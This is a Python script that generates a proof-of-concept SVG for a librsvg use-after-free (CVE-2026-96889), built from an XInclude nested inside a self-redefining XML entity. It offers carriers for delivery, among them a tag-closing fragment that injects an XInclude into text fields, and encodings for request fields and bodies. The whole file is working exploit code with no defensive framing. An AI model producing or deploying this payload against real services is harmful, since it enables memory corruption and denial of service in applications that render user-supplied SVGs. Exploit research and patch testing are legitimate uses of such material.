#!/usr/bin/env python3
"""Generate an SVG PoC for the librsvg UAF (CVE-2026-96889)."""

import argparse
import base64
import json
import re
import sys
from pathlib import Path
from urllib.parse import quote, quote_from_bytes


XML_NAME = re.compile(r"[A-Za-z_][A-Za-z0-9_.-]*")
XINCLUDE_NS = "http://www.w3.org/2001/XInclude"


def xml_name(value: str) -> str:
    if not XML_NAME.fullmatch(value):
        raise ValueError(f"invalid XML name: {value!r}")
    return value


def build_svg(entity: str) -> bytes:
    entity = xml_name(entity)
    inner = (
        '<?xml version="1.0"?>'
        f'<!DOCTYPE svg [<!ENTITY {entity} "R">]>'
        '<svg xmlns="http://www.w3.org/2000/svg"/>'
    )
    inner_url = "data:image/svg+xml;base64," + base64.b64encode(inner.encode()).decode()
    outer = (
        '<?xml version="1.0"?>\n'
        '<!DOCTYPE svg [\n'
        f'  <!ENTITY {entity} \'<xi:include xmlns:xi="{XINCLUDE_NS}" href="{inner_url}" parse="xml"/>\'>\n'
        ']>\n'
        f'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xi="{XINCLUDE_NS}" width="1" height="1">\n'
        f'  &{entity};\n'
        '</svg>\n'
    )
    return outer.encode()


def render_carrier(svg: bytes, carrier: str, tag: str) -> bytes:
    if carrier == "svg":
        return svg
    if carrier == "data-url":
        return b"data:image/svg+xml;base64," + base64.b64encode(svg)
    if carrier == "xml-text":
        tag = xml_name(tag)
        url = "data:image/svg+xml," + quote(svg.decode(), safe="")
        fragment = (
            f'</{tag}><xi:include xmlns:xi="{XINCLUDE_NS}" '
            f'href="{url}" parse="xml"/><{tag}>'
        )
        return fragment.encode()
    raise ValueError(f"unsupported carrier: {carrier}")


def encode_output(payload: bytes, encoding: str) -> bytes:
    if encoding == "none":
        return payload
    if encoding == "base64":
        return base64.b64encode(payload)
    if encoding == "json-string":
        return json.dumps(payload.decode(), ensure_ascii=False).encode()
    if encoding == "urlencoded":
        return quote_from_bytes(payload, safe="").encode()
    raise ValueError(f"unsupported encoding: {encoding}")


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--entity", default="active", help="outer entity name (default: active)")
    parser.add_argument(
        "--carrier",
        choices=("svg", "data-url", "xml-text"),
        default="svg",
        help="raw SVG, a full SVG data URL, or text for an unescaped SVG child",
    )
    parser.add_argument(
        "--tag",
        default="title",
        help="element to close and reopen with --carrier xml-text (default: title)",
    )
    parser.add_argument(
        "--encode",
        choices=("none", "base64", "json-string", "urlencoded"),
        default="none",
        help="optional encoding for a field or request body",
    )
    parser.add_argument(
        "-o",
        "--output",
        help="output file, or - for stdout (default: uaf.svg for raw SVG, stdout otherwise)",
    )
    args = parser.parse_args()

    try:
        svg = build_svg(args.entity)
        payload = encode_output(render_carrier(svg, args.carrier, args.tag), args.encode)
    except ValueError as exc:
        parser.error(str(exc))

    output = args.output
    if output is None:
        output = "uaf.svg" if args.carrier == "svg" and args.encode == "none" else "-"
    if output == "-":
        sys.stdout.buffer.write(payload)
    else:
        Path(output).write_bytes(payload)


if __name__ == "__main__":
    main()
